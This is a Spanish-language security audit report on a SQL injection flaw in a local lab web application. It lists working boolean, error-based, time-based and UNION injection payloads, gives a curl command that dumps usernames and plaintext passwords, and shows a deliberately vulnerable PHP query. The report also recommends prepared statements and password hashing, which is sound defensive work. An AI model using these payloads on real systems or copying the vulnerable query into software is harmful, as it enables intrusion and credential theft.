# Informe de Auditoría de Seguridad - SQL Injection
**Objetivo:** http://web.dev.local:8083  
**Fecha:** 2026-04-25T11:37:10Z  
**Herramientas utilizadas:** sqlmap, curl  

---

## Resumen Ejecutivo

Se realizó un análisis de seguridad sobre la aplicación web en `http://web.dev.local:8083`. Se identificó y explotó exitosamente una vulnerabilidad de **SQL Injection** en el parámetro `id` del formulario de búsqueda de usuarios. La explotación permitió obtener acceso completo a la base de datos, incluyendo credenciales de todos los usuarios.

---

## Descripción de la Aplicación

La aplicación expone una única página con un formulario de búsqueda de usuarios. El formulario envía el parámetro `id` mediante método GET a la misma URL (`/?id=<valor>&Submit=Submit`). La respuesta muestra datos del usuario correspondiente al ID buscado.

- **Servidor Web:** Apache 2.4.65
- **Lenguaje Backend:** PHP 8.1.33
- **Sistema Operativo:** Linux Debian
- **DBMS:** MySQL >= 5.0 (MariaDB fork)

---

## Vulnerabilidades Encontradas

### CVE/Tipo: SQL Injection (CWE-89)

**Parámetro vulnerable:** `id` (GET)  
**Severidad:** CRÍTICA  
**CVSS estimado:** 9.8 (Critical)

#### Técnicas de inyección detectadas

| Técnica | Descripción |
|---------|-------------|
| Boolean-based blind | AND boolean-based blind - WHERE or HAVING clause (subquery - comment) |
| Error-based | MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR) |
| Time-based blind | MySQL >= 5.0.12 AND time-based blind (query SLEEP) |
| UNION query | Generic UNION query (NULL) - 2 columns |

#### Payloads de ejemplo

```
# Boolean-based blind
id=1' AND 6551=(SELECT (CASE WHEN (6551=6551) THEN 6551 ELSE (SELECT 2428 UNION SELECT 1249) END))-- -

# Error-based
id=1' OR (SELECT 8777 FROM(SELECT COUNT(*),CONCAT(0x71717a6a71,(SELECT (ELT(8777=8777,1))),0x717a716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- mTmP

# Time-based blind
id=1' AND (SELECT 7778 FROM (SELECT(SLEEP(5)))JVzb)-- YZiE

# UNION query (exfiltración de datos)
id=1' UNION SELECT NULL,CONCAT(username,0x3a,password) FROM users-- -
```

---

## Explotación

### Enumeración de Bases de Datos

Se obtuvieron 5 bases de datos disponibles:

```
[*] information_schema
[*] mysql
[*] performance_schema
[*] sqli_demo
[*] sys
```

### Enumeración de Tablas (base de datos: sqli_demo)

```
Database: sqli_demo
[1 table]
+-------+
| users |
+-------+
```

### Volcado de Datos - Tabla `users`

Mediante UNION-based SQL injection se exfiltró el contenido completo de la tabla `users`:

| user_id | username   | first_name | last_name | email               | password    |
|---------|------------|------------|-----------|---------------------|-------------|
| 1       | admin      | John       | Doe       | admin@example.com   | password123 |
| 2       | jsmith     | Jane       | Smith     | jane@example.com    | secret456   |
| 3       | bjohnson   | Bob        | Johnson   | bob@example.com     | mypass789   |
| 4       | awilliams  | Alice      | Williams  | alice@example.com   | qwerty123   |
| 5       | cbrown     | Charlie    | Brown     | charlie@example.com | password    |
| 6       | ddavis     | Diana      | Davis     | diana@example.com   | secure123   |
| 7       | emiller    | Eve        | Miller    | eve@example.com     | hackme      |
| 8       | fwilson    | Frank      | Wilson    | frank@example.com   | admin123    |

> ⚠️ **Las contraseñas se almacenan en texto plano**, sin ningún tipo de hashing o cifrado.

### Verificación Manual

Se confirmó la explotación manualmente con curl:

```bash
curl "http://web.dev.local:8083/?id=1'+UNION+SELECT+NULL,CONCAT(username,0x3a,password)+FROM+users--+-&Submit=Submit"
```

La respuesta devolvió todos los pares `usuario:contraseña` de la tabla.

---

## Análisis de Causa Raíz

La vulnerabilidad existe porque la aplicación PHP construye la consulta SQL concatenando directamente el input del usuario sin ningún tipo de sanitización ni uso de consultas preparadas (prepared statements). El código probablemente tiene una estructura similar a:

```php
$id = $_GET['id'];
$query = "SELECT * FROM users WHERE user_id = '$id'";
$result = mysqli_query($conn, $query);
```

---

## Impacto

- **Confidencialidad:** TOTAL — Acceso a todos los datos de usuarios incluyendo credenciales.
- **Integridad:** ALTA — Es posible modificar o eliminar datos en la base de datos.
- **Disponibilidad:** MEDIA — Posibilidad de DROP de tablas o bases de datos.
- **Alcance lateral:** Las credenciales expuestas en texto plano permiten ataques de reutilización de contraseñas en otros sistemas.

---

## Recomendaciones

1. **Usar consultas preparadas (Prepared Statements):**
   ```php
   $stmt = $pdo->prepare("SELECT * FROM users WHERE user_id = ?");
   $stmt->execute([$id]);
   ```

2. **Validar y filtrar inputs:** Verificar que el parámetro `id` sea exclusivamente numérico antes de usarlo.

3. **Hashear contraseñas:** Implementar bcrypt o Argon2 para el almacenamiento seguro de contraseñas (nunca texto plano).

4. **Principio de mínimo privilegio:** El usuario de base de datos de la aplicación no debería tener acceso a `information_schema` ni permisos para listar todas las bases de datos.

5. **WAF:** Considerar desplegar un Web Application Firewall para detectar y bloquear intentos de SQL injection.

6. **Mensajes de error:** Deshabilitar la exposición de errores de base de datos en producción.

---

## Conclusión

La aplicación web en `http://web.dev.local:8083` presenta una vulnerabilidad crítica de SQL Injection clásica. La explotación resultó trivial y permitió la extracción completa de datos de usuarios, incluyendo credenciales en texto plano. Se recomienda remediar de forma inmediata implementando consultas parametrizadas y hasheando las contraseñas almacenadas.
